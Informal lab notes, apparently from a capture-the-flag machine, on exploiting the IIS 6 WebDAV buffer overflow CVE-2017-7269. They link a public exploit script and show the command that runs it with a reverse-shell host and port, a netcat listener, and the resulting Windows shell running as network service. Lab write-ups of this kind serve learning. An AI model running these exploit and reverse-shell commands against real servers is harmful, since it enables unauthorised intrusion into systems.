https://vk9-sec.com/microsoft-iis-scstoragepathfromurl-function-buffer-overflow-cve-2017-7269/

used above POC for identified CVE

got the script from here

https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell



initially it was failing 

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM/iis6-exploit-2017-CVE-2017-7269]
â””â”€# python3 iis6.py  10.10.10.14 80 10.10.16.6 4455 
  File "/root/Desktop/THM/iis6-exploit-2017-CVE-2017-7269/iis6.py", line 6
    print 'usage:iis6webdav.py targetip targetport reverseip reverseport\n'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?



checked the error and found out that code was written for pyton2 and i was running it using python3


so changed that and started a netcat listernet on port 4455

and ran this

â”€â”€(rootðŸ’€kali)-[~/Desktop/THM/iis6-exploit-2017-CVE-2017-7269]
â””â”€# python2 iis6.py  10.10.10.14 80 10.10.16.6 4455 


got a  shell


â”€â”€(rootðŸ’€kali)-[~]
â””â”€# nc -lnvp 4455
listening on [any] 4455 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>



C:\Documents and Settings\All Users>whoami
whoami
nt authority\network service


Now since i am learning windows priv esc as i got went with the writeup here to see how we can manually esclate priv on windows machine


stopped here and wasted 4-5 hrs of my life to get a free course on windows priv esc fundamentals


will get it tomorrow so will continue iwht windows machine tomorrow


Okay so I ma back after leaninghalf the course and repeated the steps till here


